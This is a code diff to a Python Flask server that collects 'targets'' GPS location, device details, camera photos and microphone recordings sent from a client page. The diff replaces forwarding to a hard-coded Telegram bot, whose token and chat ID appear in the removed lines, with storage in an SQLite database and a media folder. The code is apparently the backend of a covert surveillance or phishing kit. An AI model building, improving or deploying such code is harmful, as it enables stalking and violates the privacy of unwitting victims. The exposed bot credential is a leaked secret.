@@ -1,34 +1,38 @@
 import os
 import base64
-import requests
 from flask import Flask, request, jsonify
 from flask_cors import CORS
+from flask_sqlalchemy import SQLAlchemy
 
 app = Flask(__name__)
 CORS(app)
 
-# --- APNI DETAILS YAHAN CHECK KAREIN ---
-BOT_TOKEN = "8517364051:AAFUprGh5HLg101v11PUWiPxGXsu6D8gQY0"
-CHAT_ID = "8450988216"
+# Database Configuration (SQLite database file 'data.db' banayega)
+app.config['SQLALCHEMY_DATABASE_URI'] = 'sqlite:///data.db'
+app.config['SQLALCHEMY_TRACK_MODIFICATIONS'] = False
+db = SQLAlchemy(app)
 
-def send_telegram(message=None, photo_path=None, audio_path=None):
-    if photo_path:
-        url = f"https://api.telegram.org/bot{BOT_TOKEN}/sendPhoto"
-        with open(photo_path, 'rb') as photo:
-            requests.post(url, data={'chat_id': CHAT_ID}, files={'photo': photo})
-    
-    if audio_path:
-        url = f"https://api.telegram.org/bot{BOT_TOKEN}/sendAudio"
-        with open(audio_path, 'rb') as audio:
-            requests.post(url, data={'chat_id': CHAT_ID}, files={'audio': audio})
+# Database Table (Model) Define Karna
+class TargetData(db.Model):
+    id = db.Column(db.Integer, primary_key=True)
+    data_type = db.Column(db.String(50))  # 'info', 'image', ya 'audio'
+    latitude = db.Column(db.String(50), nullable=True)
+    longitude = db.Column(db.String(50), nullable=True)
+    device = db.Column(db.String(100), nullable=True)
+    file_path = db.Column(db.String(200), nullable=True)  # Images/Audio ka path save karne ke liye
 
-    if message:
-        url = f"https://api.telegram.org/bot{BOT_TOKEN}/sendMessage"
-        requests.post(url, json={'chat_id': CHAT_ID, 'text': message})
+# Database aur Tables ko initialize karna
+with app.app_context():
+    db.create_all()
+
+# Uploads folder banana jahan photos aur audio files save hongi
+UPLOAD_FOLDER = 'saved_media'
+if not os.path.exists(UPLOAD_FOLDER):
+    os.makedirs(UPLOAD_FOLDER)
 
 @app.route('/')
 def index():
-    return "VanX Server Active"
+    return "VivanX Server Active"
 
 @app.route('/log', methods=['POST'])
 def log_data():
@@ -40,28 +44,39 @@ def log_data():
         lat = data.get('lat')
         lon = data.get('lon')
         dev = data.get('device')
-        msg = f"📍 *Target Found!*\n\nDevice: {dev}\nLocation: {lat}, {lon}\nMaps: https://www.google.com/maps?q={lat},{lon}"
-        send_telegram(message=msg)
+        
+        # Database me save karein
+        new_entry = TargetData(data_type='info', latitude=lat, longitude=lon, device=dev)
+        db.session.add(new_entry)
+        db.session.commit()
 
     # 2. Photo handle karna
     elif data_type == 'image':
         img_base64 = data.get('image').split(',')[1]
-        with open("capture.jpg", "wb") as f:
+        file_path = os.path.join(UPLOAD_FOLDER, f"capture_{os.urandom(4).hex()}.jpg")
+        
+        with open(file_path, "wb") as f:
             f.write(base64.b64decode(img_base64))
-        send_telegram(photo_path="capture.jpg")
-        if os.path.exists("capture.jpg"):
-            os.remove("capture.jpg")
+            
+        # Database me photo ka path save karein
+        new_entry = TargetData(data_type='image', file_path=file_path)
+        db.session.add(new_entry)
+        db.session.commit()
 
-    # 3. Audio handle karna (YE WALA PART MISSING THA)
+    # 3. Audio handle karna
     elif data_type == 'audio':
         audio_base64 = data.get('audio').split(',')[1]
-        with open("voice.ogg", "wb") as f:
+        file_path = os.path.join(UPLOAD_FOLDER, f"voice_{os.urandom(4).hex()}.ogg")
+        
+        with open(file_path, "wb") as f:
             f.write(base64.b64decode(audio_base64))
-        send_telegram(audio_path="voice.ogg")
-        if os.path.exists("voice.ogg"):
-            os.remove("voice.ogg")
+            
+        # Database me audio ka path save karein
+        new_entry = TargetData(data_type='audio', file_path=file_path)
+        db.session.add(new_entry)
+        db.session.commit()
 
-    return jsonify({"status": "success"}), 200
+    return jsonify({"status": "success", "message": "Data saved to database"}), 200
 
 if __name__ == '__main__':
     app.run(host='0.0.0.0', port=5000)
